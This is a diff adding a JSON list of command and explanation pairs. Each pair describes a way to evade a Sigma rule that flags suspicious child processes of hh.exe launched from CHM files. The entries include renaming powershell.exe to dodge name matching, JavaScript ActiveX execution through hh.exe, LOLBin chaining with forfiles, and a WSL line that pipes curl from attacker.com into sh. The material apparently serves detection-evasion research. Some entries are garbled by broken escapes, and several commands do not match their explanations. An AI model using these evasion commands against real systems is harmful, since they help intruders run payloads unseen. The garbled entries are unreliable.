@@ -1,0 +1,46 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe %TEMP%\\not_suspicious.exe && hh.exe C:\\path\\to\\exploit.chm",
+    "explanation": "The Sigma rule relies on the 'Image' field ending with specific, well-known binary names (e.g., \\powershell.exe). By copying a targeted binary like PowerShell to a temporary directory and renaming it (e.g., not_suspicious.exe) before execution via the CHM payload, the 'Image' path will no longer match the hardcoded list in the detection logic, effectively bypassing the rule."
+  },
+  {
+    "output": "hh.exe javascript:eval(\"new ActiveXObject('WScript.Shell').Run('calc.exe')\")",
+    "explanation": "This bypass uses living-off-the-land techniques to execute code directly within the context of the HH.exe process or by spawning a process not explicitly listed in the 'selection' block. Since 'calc.exe' is not in the monitored list of child processes, the execution will not trigger the alert."
+  },
+  {
+    "output": "hh.exe C:\\path\\to\\malicious.chm",
+    "explanation": "If the malicious CHM uses an Unquoted Service Path or a DLL hijacking technique to load a malicious library into a legitimate process that isn't on the 'Image' list (such as notepad.exe or a third-party app), the rule will not fire because it only inspects specific, high-value Microsoft binaries as child processes."
+  },
+  {
+    "output": "C:\\Windows\\hh.exe C:\\path\\to\\exploit.chm",
+    "explanation": "To bypass this detection, the attacker can use a child process that is not explicitly listed in the 'Image|endswith' section of the Sigma rule. For example, spawning 'explorer.exe', 'notepad.exe', or a renamed copy of 'powershell.exe' (e.g., 'not_ps.exe') would evade the rule because the detection logic relies on a static blacklist of common living-off-the-land binaries (LOLBins)."
+  },
+  {
+    "output": "hh.exe -decompile C:\\temp\\output C:\\path\\to\\malicious.chm",
+    "explanation": "This command uses the legitimate decompile functionality of hh.exe. If the malicious payload is dropped to disk via decompression rather than direct execution of a child process, the 'process_creation' event for the specific blacklisted binaries won't be triggered in the context of being a child of hh.exe."
+  },
+  {
+    "output": "C:\\Windows\\hh.exe javascript:eval('new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\")')",
+    "explanation": "By executing code within the context of the HTML Help engine itself (such as via JavaScript/ActiveX inside a CHM file) to launch a process not on the list (like 'calc.exe' or a custom stager), the specific selection criteria for suspicious child processes are avoided."
+  },
+  {
+    "output": "hh.exe mal.chm (where the payload executes: C:\\Windows\\System32\\forfiles.exe /c \"cmd.exe /c echo bypass\")",
+    "explanation": "The detection logic relies on a static list of known suspicious child processes. This can be bypassed by using an intermediary Living off the Land binary (LOLBin) not on the list, such as forfiles.exe, explorer.exe, or wsl.exe. The unlisted intermediary then spawns the actual malicious shell, breaking the direct parent-child relationship required by the rule."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Temp\\sys_update.exe && hh.exe mal.chm (where payload executes: C:\\Temp\\sys_update.exe)",
+    "explanation": "The rule uses 'Image|endswith' to match specific executable names. An attacker can evade this completely by copying a restricted binary like powershell.exe or cmd.exe to a new directory and renaming it. When hh.exe spawns 'sys_update.exe', the string match fails and the alert is not triggered."
+  },
+  {
+    "output": "C:\\Windows\\explorer.exe C:\\path\\\to\\malicious\\_payload.exe",
+    "explanation": "This simulates a child process spawned by hh.exe using explorer.exe to launch a payload. The rule is bypassed because explorer.exe is missing from the hardcoded 'Image|endswith' blocklist."
+  },
+  {
+    "output": "C:\\Temp\\\renamed\\_cmd.exe /c whoami",
+    "explanation": "This simulates an adversary copying and renaming a command interpreter (like cmd.exe) to an arbitrary name before having hh.exe spawn it. The rule is bypassed because it strictly relies on matching the filename at the end of the Image path, rather than checking OriginalFileName or file hashes."
+  },
+  {
+    "output": "C:\\Windows\\System32\\bash.exe -c \"curl http://attacker.com/payload.sh | sh\"",
+    "explanation": "This simulates utilizing Windows Subsystem for Linux (WSL) to execute commands. bash.exe (or wsl.exe) is a powerful LOLBin that is not included in the targeted 'Image|endswith' list."
+  }
+]
